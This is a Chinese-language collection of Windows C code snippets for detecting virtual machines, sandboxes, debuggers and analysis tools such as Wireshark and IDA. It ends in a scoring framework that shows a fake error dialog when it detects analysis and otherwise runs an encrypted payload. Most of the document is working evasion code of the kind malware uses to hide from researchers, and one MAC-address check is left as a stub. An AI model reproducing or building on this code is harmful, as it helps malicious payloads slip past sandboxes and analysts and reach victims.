# 反虚拟化/反调试代码片段集

## 虚拟化检测（C/C++）

### CPUID 检测

```c
#include <intrin.h>

int detect_hypervisor() {
    int cpuinfo[4] = {0};
    __cpuid(cpuinfo, 1);
    // ECX bit 31 = Hypervisor Present
    return (cpuinfo[2] >> 31) & 1;
}

char* get_hypervisor_brand() {
    int cpuinfo[4] = {0};
    static char brand[13] = {0};
    __cpuid(cpuinfo, 0x40000000);
    memcpy(brand, &cpuinfo[1], 4);     // EBX
    memcpy(brand + 4, &cpuinfo[2], 4); // ECX
    memcpy(brand + 8, &cpuinfo[3], 4); // EDX
    // "VMwareVMware" / "Microsoft Hv" / "VBoxVBoxVBox" / "KVMKVMKVM"
    return brand;
}
```

### RDTSC 时间差检测

```c
#include <intrin.h>

int detect_vm_rdtsc() {
    unsigned long long t1, t2;
    t1 = __rdtsc();
    // 执行一个简单操作（不能被优化掉）
    __cpuid((int[4]){0}, 0);
    t2 = __rdtsc();
    // VM 下 CPUID 触发 VM Exit → 时间差 > 1000 cycles
    // 物理机 < 500 cycles
    return (t2 - t1) > 1000;
}
```

### 注册表检测 (Windows)

```c
int detect_vm_registry() {
    HKEY hKey;
    // VMware
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\VMware, Inc.\\VMware Tools", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return 1;
    }
    // VirtualBox
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Oracle\\VirtualBox Guest Additions", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return 1;
    }
    // Hyper-V
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return 1;
    }
    return 0;
}
```

### MAC 地址前缀检测

```c
int detect_vm_mac() {
    // 已知虚拟化 MAC 前缀
    const char* vm_macs[] = {
        "00:0C:29",  // VMware
        "00:50:56",  // VMware
        "08:00:27",  // VirtualBox
        "00:1C:42",  // Parallels
        "00:16:3E",  // Xen
        "00:15:5D",  // Hyper-V
        NULL
    };
    // 通过 GetAdaptersInfo 获取 MAC 并比对
    // ...
    return 0;
}
```

### 硬件资源检测

```c
int detect_sandbox_resources() {
    int score = 0;

    // CPU 核心 < 2
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) score++;

    // 内存 < 4GB
    MEMORYSTATUSEX mem = {sizeof(mem)};
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < 4ULL * 1024 * 1024 * 1024) score++;

    // 磁盘 < 60GB
    ULARGE_INTEGER disk;
    GetDiskFreeSpaceEx("C:\\", NULL, &disk, NULL);
    if (disk.QuadPart < 60ULL * 1024 * 1024 * 1024) score++;

    // 屏幕分辨率异常
    int cx = GetSystemMetrics(SM_CXSCREEN);
    int cy = GetSystemMetrics(SM_CYSCREEN);
    if (cx <= 800 || cy <= 600) score++;

    // 2+ 项命中 → 可能是沙箱
    return score >= 2;
}
```

### 进程检测

```c
int detect_analysis_tools() {
    const wchar_t* badProcesses[] = {
        L"wireshark.exe", L"procmon.exe", L"procexp.exe",
        L"x64dbg.exe", L"x32dbg.exe", L"ollydbg.exe",
        L"idaq.exe", L"idaq64.exe", L"ida.exe",
        L"pestudio.exe", L"fiddler.exe",
        L"vmtoolsd.exe", L"vmwaretray.exe",  // VMware
        L"VBoxService.exe", L"VBoxTray.exe", // VBox
        L"sandboxiedcomlaunch.exe",           // Sandboxie
        NULL
    };

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = {sizeof(pe)};
    Process32FirstW(snapshot, &pe);
    do {
        for (int i = 0; badProcesses[i]; i++) {
            if (_wcsicmp(pe.szExeFile, badProcesses[i]) == 0) {
                CloseHandle(snapshot);
                return 1;
            }
        }
    } while (Process32NextW(snapshot, &pe));

    CloseHandle(snapshot);
    return 0;
}
```

## 反调试检测

### IsDebuggerPresent 及绕过

```c
// 基础检测（容易被 hook）
if (IsDebuggerPresent()) exit(0);

// 直接读 PEB（绕过 API hook）
#ifdef _WIN64
    BOOL debugged = *(PBOOL)((PBYTE)__readgsqword(0x60) + 2);
#else
    BOOL debugged = *(PBOOL)((PBYTE)__readfsdword(0x30) + 2);
#endif

// NtQueryInformationProcess（多种检测）
typedef NTSTATUS(WINAPI* pNtQIP)(HANDLE, int, PVOID, ULONG, PULONG);
pNtQIP NtQIP = (pNtQIP)GetProcAddress(GetModuleHandle("ntdll"), "NtQueryInformationProcess");

// ProcessDebugPort (0x7)
DWORD_PTR debugPort = 0;
NtQIP(GetCurrentProcess(), 7, &debugPort, sizeof(debugPort), NULL);
if (debugPort) exit(0);

// ProcessDebugObjectHandle (0x1E)
HANDLE debugObj = NULL;
NtQIP(GetCurrentProcess(), 0x1E, &debugObj, sizeof(debugObj), NULL);
if (debugObj) exit(0);

// ProcessDebugFlags (0x1F) — 返回 0 表示被调试
DWORD noDebug = 0;
NtQIP(GetCurrentProcess(), 0x1F, &noDebug, sizeof(noDebug), NULL);
if (noDebug == 0) exit(0);
```

### 硬件断点检测

```c
int detect_hardware_breakpoints() {
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx)) {
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
            return 1;  // 有硬件断点
        }
    }
    return 0;
}
```

### INT 2D 反调试

```c
// INT 2D 在非调试状态会触发异常
// 在调试器中会被当作断点吞掉
__try {
    __asm { int 0x2d }
    // 如果到这里 → 被调试（异常被调试器处理了）
    exit(0);
} __except (EXCEPTION_EXECUTE_HANDLER) {
    // 正常执行 → 未被调试
}
```

## 组合检测框架

```c
typedef int (*check_func)();

typedef struct {
    check_func func;
    const char* name;
    int weight;
} SecurityCheck;

int run_all_checks() {
    SecurityCheck checks[] = {
        {detect_hypervisor,         "CPUID Hypervisor",   2},
        {detect_vm_rdtsc,           "RDTSC Timing",       3},
        {detect_vm_registry,        "VM Registry",        2},
        {detect_vm_mac,             "VM MAC Address",     1},
        {detect_sandbox_resources,  "Low Resources",      2},
        {detect_analysis_tools,     "Analysis Tools",     3},
        {detect_hardware_breakpoints, "HW Breakpoints",   3},
    };

    int total_score = 0;
    int num_checks = sizeof(checks) / sizeof(checks[0]);

    for (int i = 0; i < num_checks; i++) {
        if (checks[i].func()) {
            total_score += checks[i].weight;
        }
    }

    // 阈值：得分 >= 4 认为是分析环境
    return total_score >= 4;
}

// 使用
int main() {
    if (run_all_checks()) {
        // 执行无害行为（decoy）
        MessageBox(NULL, "Application Error", "Error", MB_OK);
        return 1;
    }
    // 执行真实 payload
    decrypt_and_execute_payload();
    return 0;
}
```
